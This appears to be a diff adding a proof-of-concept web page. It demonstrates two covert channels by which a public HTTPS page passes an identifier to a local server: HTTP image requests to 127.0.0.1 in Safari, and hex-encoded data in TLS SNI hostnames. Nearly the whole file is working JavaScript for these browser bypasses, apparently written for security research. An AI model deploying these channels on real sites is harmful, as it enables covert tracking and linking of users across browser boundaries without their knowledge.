@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>localhost exfil PoC</title>
+<style>
+  body { font: 13px/1.6 ui-monospace, Menlo, monospace; max-width: 600px; margin: 3em auto; padding: 0 1em; color-scheme: light dark; }
+  h1 { font-size: 16px; }
+  h2 { font-size: 13px; margin: 1.8em 0 0.4em; border-bottom: 1px solid #ccc; padding-bottom: 3px; }
+  label { font-size: 11px; color: #666; display: block; margin: 0.5em 0 0.2em; }
+  input { font: inherit; padding: 4px 7px; border: 1px solid #ccc; border-radius: 3px; width: 100%; box-sizing: border-box; }
+  button { margin-top: 0.6em; padding: 6px 16px; font: inherit; cursor: pointer; }
+  .log { margin-top: 0.6em; font-size: 11px; background: #f5f5f5; border: 1px solid #ddd; border-radius: 3px; padding: 8px; white-space: pre-wrap; min-height: 40px; }
+  .ok  { color: #080; }
+  .err { color: #999; }
+  .tag { color: #00c; font-weight: bold; }
+  p.note { font-size: 11px; color: #888; margin: 0.3em 0 0; }
+</style>
+</head>
+<body>
+
+<h1>localhost exfil — PoC</h1>
+<p class="note">Requires <code>server.py</code> running locally. Page must be served from a public HTTPS origin.</p>
+
+<!-- ── Channel 1: IMG ─────────────────────────────────────── -->
+<h2>Channel 1 — &lt;img&gt; via HTTP  <span style="color:#888;font-weight:normal">(Safari only)</span></h2>
+<p class="note">Safari loads HTTP images from localhost even from an HTTPS page (passive mixed-content). Identifier travels in the URL query string.</p>
+
+<label>Identifier</label>
+<input id="imgId" value="hello-from-img">
+<label>Host:port</label>
+<input id="imgTarget" value="127.0.0.1:8765">
+<button id="imgSend">Send via IMG</button>
+<div class="log" id="imgLog">…</div>
+
+<!-- ── Channel 2: SNI ─────────────────────────────────────── -->
+<h2>Channel 2 — TLS SNI  <span style="color:#888;font-weight:normal">(Safari + Chrome)</span></h2>
+<p class="note">Identifier encoded as hex in the SNI hostname. Server reads it from the raw TLS ClientHello before any cert check. No certificate required.</p>
+
+<label>Identifier</label>
+<input id="sniId" value="hello-from-sni">
+<label>SNI base domain <span style="color:#aaa">(resolves to 127.0.0.1)</span></label>
+<input id="sniBase" value="sni.localtest.me">
+<label>Port</label>
+<input id="sniPort" value="9443" style="width:100px">
+<button id="sniSend">Send via SNI</button>
+<div class="log" id="sniLog">…</div>
+
+<script>
+// ── helpers ──────────────────────────────────────────────────────────────────
+function write(el, text, cls) {
+  if (el.textContent === '…') el.textContent = '';
+  const d = document.createElement('div');
+  d.textContent = text;
+  if (cls) d.className = cls;
+  el.appendChild(d);
+}
+
+async function doFetch(url) {
+  const ctrl = new AbortController();
+  const t = setTimeout(() => ctrl.abort(), 7000);
+  try {
+    await fetch(url, { mode: 'no-cors', cache: 'no-store', signal: ctrl.signal });
+    clearTimeout(t);
+    return { ok: true };
+  } catch(e) {
+    clearTimeout(t);
+    return { ok: false, name: e.name, msg: e.message };
+  }
+}
+
+// ── Channel 1: IMG ───────────────────────────────────────────────────────────
+document.getElementById('imgSend').addEventListener('click', () => {
+  const id     = document.getElementById('imgId').value.trim();
+  const target = document.getElementById('imgTarget').value.trim();
+  const log    = document.getElementById('imgLog');
+  log.textContent = '';
+
+  const url = `http://${target}/track?id=${encodeURIComponent(id)}`;
+  write(log, `→ ${url}`, 'tag');
+
+  const img = new Image();
+  img.onload  = () => write(log, '✓ onload fired — request reached server', 'ok');
+  img.onerror = () => write(log, '✗ onerror — browser blocked the request', 'err');
+  img.src = url;
+});
+
+// ── Channel 2: SNI ───────────────────────────────────────────────────────────
+document.getElementById('sniSend').addEventListener('click', async () => {
+  const id   = document.getElementById('sniId').value.trim();
+  const base = document.getElementById('sniBase').value.trim();
+  const port = document.getElementById('sniPort').value.trim();
+  const log  = document.getElementById('sniLog');
+  log.textContent = '';
+
+  const hex = Array.from(new TextEncoder().encode(id))
+    .map(b => b.toString(16).padStart(2,'0')).join('');
+
+  const chunks = [];
+  for (let i = 0; i < hex.length; i += 60) chunks.push(hex.slice(i, i+60));
+
+  const hostnames = chunks.length === 1
+    ? [`id-${chunks[0]}.${base}`]
+    : chunks.map((c, i) => `id-${c}-${i}.${base}`);
+
+  for (const h of hostnames) {
+    const url = `https://${h}:${port}/`;
+    write(log, `→ ${h}`, 'tag');
+    const r = await doFetch(url);
+    if (r.ok) {
+      write(log, '  (server responded — unexpected)', 'ok');
+    } else {
+      write(log, `  ${r.name} (expected — SNI arrived before TLS rejected)`, 'err');
+      write(log, '  ✓ check server.py stdout', 'ok');
+    }
+  }
+});
+</script>
+</body>
+</html>
